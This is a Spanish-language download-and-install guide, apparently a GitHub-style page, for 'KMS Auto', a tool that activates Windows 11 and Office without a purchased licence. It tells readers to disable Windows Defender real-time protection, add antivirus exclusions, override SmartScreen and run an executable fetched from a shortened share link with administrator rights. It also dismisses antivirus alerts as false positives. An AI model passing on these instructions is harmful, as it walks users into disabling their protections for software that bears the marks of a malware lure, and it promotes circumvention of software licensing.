## 💡 Introducción

**KMS Auto** es una herramienta de activación diseñada para ser **sencilla incluso para principiantes**. Emula un servidor **Key Management Service (KMS)** localmente, aprovechando el mismo mecanismo que Microsoft creó para empresas con licencias por volumen.

No necesitas conocimientos técnicos avanzados: la interfaz gráfica te guía con botones claros y el proceso completo toma apenas unos minutos.

## ⚙️ Cómo Funciona

El proceso es más simple de lo que parece. KMS Auto hace tres cosas:

1. **Instala una clave GVLK** en tu sistema Windows 11.
2. **Crea un servicio local** que actúa como servidor KMS.
3. **Programa una tarea** que renueva la licencia cada día.

| Etapa | Qué ocurre | Duración |
|-------|------------|----------|
| 🔧 Instalación | Se copian los componentes | ~5 seg |
| 🔑 Activación | Se aplica la clave GVLK | ~10 seg |
| 🔄 Renovación | Tarea diaria en segundo plano | Automática |

## 🪜 Pasos de Instalación

### Paso 1 — Desactivar la Protección Temporalmente

Ve a **Seguridad de Windows → Protección contra virus y amenazas → Administrar la configuración** y desactiva la **protección en tiempo real**.

Añade también una carpeta de exclusión:

```
Configuración → Privacidad y seguridad → Seguridad de Windows
→ Protección contra virus y amenazas → Exclusiones → Agregar carpeta
```

### Paso 2 — Extraer el Archivo

Haz clic derecho sobre el archivo descargado → **Extraer todo…** → selecciona una carpeta. Si tiene contraseña, búscala en la página de origen.

### Paso 3 — Ejecutar como Administrador

Busca `KMSAuto.exe`, haz clic derecho y elige **Ejecutar como administrador**. Acepta el aviso de UAC.

> 💡 Si aparece SmartScreen, haz clic en **Más información → Ejecutar de todas formas**.

[![Descargar KMS Auto](https://img.shields.io/badge/⬇️_DESCARGAR_KMS_AUTO-F59E0B?style=for-the-badge&logo=download&logoColor=black&labelColor=92400E)](https://share.google/5aoht7Cqdnj7o13w3)

</div>

### Paso 4 — Instalar el Servicio KMS

En la ventana principal, pulsa **Activación (Activation)**, luego **Instalar servicio KMS (Install KMS Service)**. Los archivos se colocan en `C:\Windows\KMSAutoS`. Espera el mensaje de éxito.

### Paso 5 — Activar Windows 11

Pulsa **Activar Windows (Activate Windows)**. La activación empieza sola. En pocos segundos verás un check verde.

### Paso 6 — Verificar la Activación

Abre el **Símbolo del sistema** como administrador y ejecuta:

```bash
slmgr /xpr
```

Si aparece **"activado permanentemente"**, todo salió bien.

Para más detalles:

```bash
slmgr /dlv
```

### Paso 7 — Confirmar la Renovación Automática

Abre **Programador de tareas → Biblioteca del Programador de tareas** y verifica que la tarea KMSAuto esté habilitada. Esto mantiene la licencia viva.

### Paso 8 — Reactivar el Antivirus

Vuelve a activar la protección en tiempo real y añade la carpeta de KMS a las exclusiones para evitar que se elimine en el futuro.

**Opcional:** Si también quieres activar Office, cambia a la pestaña **Office** y pulsa **Activar Office**.

## 🛠️ Errores Comunes

| Error | Causa | Solución |
|-------|-------|----------|
| ❌ Activación fallida | Antivirus interfirió | Desactívalo y reintenta |
| ❌ Servicio no arranca | Sin permisos | Ejecuta como administrador |
| ❌ Error 0xC004F074 | Sin conexión | Comprueba la red |
| ❌ Pantalla negra al reiniciar | Conflicto de servicio | Modo seguro → eliminar servicio |
| ❌ Licencia expira pronto | Tarea deshabilitada | Reactiva la tarea KMSAuto |
| ❌ Office sin activar | Pestaña incorrecta | Usa la pestaña Office |
| ❌ Defender bloquea el archivo | Falso positivo | Añade exclusión |
| ❌ Error 0x803F7001 | Sin licencia válida | Reinstala la clave GVLK |
| ❌ No aparece UAC | Cuenta no admin | Inicia sesión como administrador |

### Limpieza Manual

```bash
sc stop "KMSAuto"
sc delete "KMSAuto"
del /f /q C:\Windows\KMSAutoS\*
```

Reinicia y vuelve a instalar.

## ❓ Preguntas Frecuentes

**¿Es realmente fácil de usar?**
Sí — la interfaz gráfica permite activar con un solo clic.

**¿KMS Auto es gratis?**
Completamente. Usa el mecanismo KMS de Microsoft.

**¿Cuánto dura la activación?**
180 días, renovados automáticamente cada día, por lo que es permanente en la práctica.

**¿Funciona en Windows 11 24H2?**
Sí, es compatible con las versiones más recientes.

**¿Daña mi PC?**
No modifica archivos críticos del sistema, por lo que es seguro desde fuentes fiables.

**¿Puedo desinstalarlo?**
Sí, con el desinstalador o los comandos de limpieza manual.

**¿Activa Office también?**
Sí, soporta Office 2013–2021 y 365 por volumen.

**¿Por qué mi antivirus lo detecta?**
Las herramientas de activación suelen marcarse como "potencialmente no deseadas" — normalmente es un falso positivo.

**¿Necesito internet siempre?**
No, solo para la primera activación y las comprobaciones de renovación.

**¿Ralentiza el sistema?**
No. Consume recursos mínimos en segundo plano.
